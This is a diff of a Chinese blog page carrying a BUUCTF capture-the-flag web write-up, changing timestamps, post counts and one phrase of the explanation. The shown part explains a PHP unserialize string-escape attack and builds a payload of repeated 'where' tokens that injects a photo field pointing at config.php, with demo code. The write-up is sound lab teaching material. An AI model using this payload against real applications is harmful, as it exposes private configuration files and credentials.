@@ -90,7 +90,7 @@
 <meta property="og:description" content="warmup靶机F12发现source.php,打开发现源码,顺着源码又发现了hint.php,得到flag in ffffllllaaaagggg,继续阅读源码。">
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="http://i2.tiimg.com/665720/e89221330848e210.png">
-<meta property="og:updated_time" content="2019-07-23T19:09:29.836Z">
+<meta property="og:updated_time" content="2019-07-23T19:17:52.476Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="BUUCTF web writeup">
 <meta name="twitter:description" content="warmup靶机F12发现source.php,打开发现源码,顺着源码又发现了hint.php,得到flag in ffffllllaaaagggg,继续阅读源码。">
@@ -344,7 +344,7 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2019-07-24T03:09:29+08:00">
+              <time title="更新于" itemprop="dateModified" datetime="2019-07-24T03:17:52+08:00">
                 2019-07-24
               </time>
             
@@ -490,7 +490,7 @@
 </li>
 </ul>
 <p><code>$new_profile = parent::filter($new_profile);</code>这条语句是对传进来的序列化后的$profile进行过滤,再看看父类的filter方法.可以看到是为了防止sql注入,对输入中的单引号、反斜杠以及一些敏感词进行替换,但是这个对序列化后字符串的替换操作,恰好提供了逃逸的的条件.切入点就是这个<code>where</code>被替换为<code>hacker</code>.举个例子:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> unserialize(<span class="string">'s:6:"where""'</span>);</span><br><span class="line"><span class="comment">//where"</span></span><br><span class="line"><span class="keyword">echo</span> unserialize(<span class="string">'s:6:"hacker""'</span>);</span><br><span class="line"><span class="comment">//hacker</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>也就是说,原来<code>where&quot;</code>是6个字符,替换为<code>hacker&quot;</code>以后,6个字符刚好读到hacker并且右边是<code>&quot;</code>成功闭合,那如果我们原来的字符串<code>&quot;</code>号还有字符,不就成功执行我们想要的操作了吗,只要控制替换操作后多的字符数等于<code>&quot;</code>加上之后字符的数量就可以了,从where替换到hacker,增加了1,那我们想要逃逸多少个字符,就用多少个where.再看个例子:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//假如我们想得到服务器上的樱井莉亚的图片(雾)</span></span><br><span class="line">$profile[<span class="string">'nickname'</span>]= <span class="string">'cxycxycxy";s:5:"photo";s:16:"yingjingliya.jpg";&#125;'</span>;</span><br><span class="line">$profile[<span class="string">'photo'</span>]= <span class="string">'cxy.jpg'</span>;</span><br><span class="line">var_dump(serialize($profile));</span><br><span class="line"><span class="comment">//a:2:&#123;s:8:"nickname";s:48:"cxycxycxy";s:5:"photo";s:16:"yingjingliya.jpg";&#125;";s:5:"photo";s:7:"cxy.jpg";&#125;</span></span><br><span class="line"><span class="comment">/*服务器操作有点憨批,非要把检测到的`cxy`3个字符替换成16个字符的`abcdefghijklmnop`,我只要用3个cxy就能逃逸`";s:5:"photo";s:16:"yingjingliya.jpg";&#125;`这39个字符*/</span></span><br><span class="line">$profile = <span class="string">'a:2:&#123;s:8:"nickname";s:48:"abcdefghijklmnopabcdefghijklmnopabcdefghijklmnop";s:5:"photo";s:16:"yingjingliya.jpg";&#125;";s:5:"photo";s:7:"cxy.jpg";&#125;'</span>;</span><br><span class="line">var_dump(unserialize($profile));</span><br><span class="line"><span class="comment">/*array(2) &#123;</span></span><br><span class="line"><span class="comment">  ["nickname"]=&gt;</span></span><br><span class="line"><span class="comment">  string(48) "abcdefghijklmnopabcdefghijklmnopabcdefghijklmnop"</span></span><br><span class="line"><span class="comment">  ["photo"]=&gt;</span></span><br><span class="line"><span class="comment">  string(16) "yingjingliya.jpg"</span></span><br><span class="line"><span class="comment">&#125;*/</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>也就是说,原来<code>where&quot;</code>是6个字符,替换为<code>hacker&quot;</code>以后,6个字符刚好读到hacker并且右边是<code>&quot;</code>成功闭合,那如果我们原来的字符串<code>&quot;</code>号后面还有字符,不就成功执行我们想要的操作了吗,只要控制替换操作后多的字符数等于<code>&quot;</code>加上之后字符的数量就可以了,从where替换到hacker,增加了1,那我们想要逃逸多少个字符,就用多少个where.再看个例子:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//假如我们想得到服务器上的樱井莉亚的图片(雾)</span></span><br><span class="line">$profile[<span class="string">'nickname'</span>]= <span class="string">'cxycxycxy";s:5:"photo";s:16:"yingjingliya.jpg";&#125;'</span>;</span><br><span class="line">$profile[<span class="string">'photo'</span>]= <span class="string">'cxy.jpg'</span>;</span><br><span class="line">var_dump(serialize($profile));</span><br><span class="line"><span class="comment">//a:2:&#123;s:8:"nickname";s:48:"cxycxycxy";s:5:"photo";s:16:"yingjingliya.jpg";&#125;";s:5:"photo";s:7:"cxy.jpg";&#125;</span></span><br><span class="line"><span class="comment">/*服务器操作有点憨批,非要把检测到的`cxy`3个字符替换成16个字符的`abcdefghijklmnop`,我只要用3个cxy就能逃逸`";s:5:"photo";s:16:"yingjingliya.jpg";&#125;`这39个字符*/</span></span><br><span class="line">$profile = <span class="string">'a:2:&#123;s:8:"nickname";s:48:"abcdefghijklmnopabcdefghijklmnopabcdefghijklmnop";s:5:"photo";s:16:"yingjingliya.jpg";&#125;";s:5:"photo";s:7:"cxy.jpg";&#125;'</span>;</span><br><span class="line">var_dump(unserialize($profile));</span><br><span class="line"><span class="comment">/*array(2) &#123;</span></span><br><span class="line"><span class="comment">  ["nickname"]=&gt;</span></span><br><span class="line"><span class="comment">  string(48) "abcdefghijklmnopabcdefghijklmnopabcdefghijklmnop"</span></span><br><span class="line"><span class="comment">  ["photo"]=&gt;</span></span><br><span class="line"><span class="comment">  string(16) "yingjingliya.jpg"</span></span><br><span class="line"><span class="comment">&#125;*/</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
 <p>知道方法以后就好办了,现在本地测试一下,了解序列化后的结构:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$profile[&apos;phone&apos;] = &apos;11111111111&apos;;</span><br><span class="line">		$profile[&apos;email&apos;] = &apos;969987508@qq.com&apos;;</span><br><span class="line">		$profile[&apos;nickname&apos;] = array(&apos;cxy&apos;);</span><br><span class="line">		$profile[&apos;photo&apos;] = &apos;cxy.jpg&apos;;</span><br><span class="line">echo serialize($profile);</span><br><span class="line">//a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;11111111111&quot;;s:5:&quot;email&quot;;s:16:&quot;969987508@qq.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:3:&quot;cxy&quot;;&#125;s:5:&quot;photo&quot;;s:7:&quot;cxy.jpg&quot;;&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
 <p>那么可以知道我们需要逃逸的字符串:<code>&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php</code>,需要31个where,构造payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php</span><br></pre></td></tr></table></figure></p>
 <p><img src="http://i2.tiimg.com/665720/e89221330848e210.png" alt="Markdown"><br>检查img标签,成功获取config.php内容的base64编码,解码后即可得到flag.</p>
@@ -658,7 +658,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">32</span>
+                  <span class="site-state-item-count">33</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -680,7 +680,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">16</span>
+                  <span class="site-state-item-count">17</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
@@ -819,7 +819,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">25.7k</span>
+    <span title="Site words total count">28k</span>
   
 </div>
 
